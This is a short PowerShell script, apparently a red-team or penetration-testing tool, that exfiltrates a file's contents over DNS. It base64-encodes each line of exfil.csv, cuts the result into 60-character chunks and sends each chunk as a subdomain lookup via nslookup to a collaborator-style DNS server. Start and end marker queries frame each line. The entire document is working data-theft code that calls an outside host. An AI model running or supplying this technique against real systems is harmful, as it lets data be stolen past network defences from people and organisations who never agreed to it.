# ExfilDataStreamDNS.ps1 by @xer0dayz - https://xerosecurity.com
#
# This script will exfil the entire contents of a file via base64 encoded strings to a custom DNS server.
#
# Update exfil.csv with the filename to exfil
# Update $dnsserver var with DNS server to use
#

$lines = Get-Content .\exfil.csv
$dnsserver = "yourhost.burpcollaborator.net"
foreach ($line in $lines){ 
    echo "Line: $line"
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($line)
    $EncodedText =[Convert]::ToBase64String($Bytes)
    echo "EncodedText: $EncodedText"
    $EncodedTextLength = $EncodedText.length
    echo "EncodedTextLength: $EncodedTextLength"

    $i = 0
    $pos = 0
    $buff = 60

    echo "Start ==============================================="
    nslookup start.$dnsserver | out-null 2> $null

    While ($i -le $EncodedTextLength) {
        $diff = $EncodedTextLength - $i
        if($diff -lt $buff){
            $EncodedTextStream = $EncodedText.substring($i,$diff) 
        }
        if($diff -gt $buff-1){
            $diff_end = $buff
            $EncodedTextStreamSubString = $EncodedText.substring($i,$diff_end) 
            $EncodedTextStream = $EncodedTextStreamSubString
        }
        $EncodedTextStream = $EncodedTextStream -replace '=','00' 2> $null
        echo "Full DNS: $EncodedTextStream.$dnsserver"
        nslookup "$EncodedTextStream.$dnsserver" | out-null 2> $null
        $i = $i+$buff
    }
    echo "End ==============================================="
    nslookup end.$dnsserver | out-null 2> $null
}